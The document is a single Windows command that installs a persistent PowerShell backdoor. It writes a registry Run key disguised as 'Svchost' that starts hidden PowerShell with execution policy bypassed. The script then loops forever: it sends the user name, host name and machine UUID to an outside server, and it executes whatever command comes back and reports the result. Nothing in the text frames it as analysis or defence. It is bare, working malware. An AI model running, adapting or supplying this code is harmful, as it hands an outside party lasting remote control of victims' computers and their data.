reg.exe add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Svchost /t REG_SZ /d 'C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c $command = \" \"; $result = \" \"; while($true){ $username = whoami; $hostname = hostname;$is_clm_active = $ExecutionContext.SessionState.LanguageMode; $uuid = get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID; $json = \"{`\"uuid`\": `\"$uuid`\",`\"username`\": `\"$username`\",`\"hostname`\": `\"$hostname`\",`\"clm`\": `\"$is_clm_active`\",`\"last_boot_time`\": `\"$last_boot_time`\",`\"output_last_command`\": `\"$result `\"}\" ; $response = iwr -Uri https://220.ip-54-37-16.eu/ -Method POST -Body $json -UseBasicParsing ;$command = $response | convertFrom-Json | select -ExpandProperty command ;if (-Not ($command -eq \"\" -Or -Not $command -eq $null)){$result = iex $command;echo $result};start-sleep 5;}'
